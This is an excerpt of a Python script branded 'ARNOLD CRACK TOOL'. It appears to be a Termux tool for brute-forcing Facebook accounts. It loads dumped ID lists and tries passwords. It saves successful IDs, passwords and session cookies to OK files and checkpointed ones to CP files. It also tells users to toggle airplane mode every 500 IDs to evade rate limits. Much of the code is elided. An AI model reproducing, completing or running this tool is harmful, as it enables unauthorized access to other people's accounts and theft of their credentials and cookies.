...
def banner():
	clear()
	wel='# WELCOME TO ARNOLD CRACK TOOL'
	cik2=mark(wel ,style='cyan')
	sol().print(cik2)
	ban='''
AUTHOR    : ARNOLD HARDY
FACEBOOK  : ARNOLD HARDY
             TEAM    : MENTAL ROMEO 🌝 CHUZA 🐥

 VERSION 4.0.4  //
//                                               //
â€¢   GITHUB : HTTPS://GITHUB.COM/MENTALROMEO'''
	oi = nel(tekz(ban,justify='center',style='bold'), style='cyan')
	cetak(nel(oi, title='[bold cyan] â€¢ DEVELOVER ARNOLD 🌝 [/bold cyan]'))
# VALIDASI TOKEN
def login():
	if 'sukses' :
#		uaku()
...
def login_lagi334():
	...
	cetak(nel(sky2,title='[bold cyan] • ARNOLD LOGIN MENU • [/bold cyan]'))
	pil=input('[â€¢] Choose : ')
	if pil in ['1','01']:
		try:
...
def result():
	...
	if kz in ['1','01']:
		try:vin = os.listdir('/sdcard/ARNOLD-DATA/CP')
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/ARNOLD-DATA/CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/ARNOLD-DATA/CP/'+geh,'r').read().splitlines()
			except:
		...
		try:vin = os.listdir('/sdcard/ARNOLD-DATA/OK')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/ARNOLD-DATA/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/ARNOLD-DATA/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
...
def file():
	...
	my_files = []
	try:
		lis = os.listdir('/sdcard/ARNOLD-DATA/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('/sdcard/ARNOLD-DATA/OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		...
		try:geh = lol[geeh]
			...
			exit()
		try:
			hf = open('/sdcard/ARNOLD-DATA/1CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/ARNOLD-DATA/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
...
def crack_file():
	...
	sol().print(mark(cek, style='green'))
	try:vin = os.listdir('/sdcard/ARNOLD-DATA/DUMP')
	except FileNotFoundError:
		gada = '# STORAGE NOT FOUND '
		sol().print(mark(gada, style='red'))
		time.sleep(2)
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/ARNOLD-DATA/DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
		...
		try:geh = lol[geeh]
			...
			sol().print(mark(ric, style='red'))
			exit()
		try:lin = open('/sdcard/ARNOLD-DATA/DUMP/'+geh,'r').read().splitlines()
		except:
			hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
			sol().print(mark(hehe, style='red'))
			time.sleep(2)
...
def passwrd():
	...
	krek = '[â€¢] OK RESULTS SAVED IN : INTERNAL MEMORY/ARNOLD-DATA/OK/%s\n[â€¢] CP RESULTS SAVED IN : INTERNAL MEMORY/ARNOLD-DATA/CP/%s\nON OF AIRPLANE MODE EVERY 500 ID'%(okc,cpc)
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/ARNOLD-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					open('/sdcard/ARNOLD-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[â€¢] ID       : {idf}\n[â€¢] PASSWORD : {pw}\n[â€¢] COOKIES  : {kuki}'
...
if __name__=='__main__':
	try:os.mkdir('/sdcard/ARNOLD-DATA/CP')
	except:pass
	try:os.mkdir('/sdcard/ARNOLD-DATA/OK')
	except:pass
	try:os.mkdir('/sdcard/ARNOLD-DATA/DUMP')
	except:pass
	login()
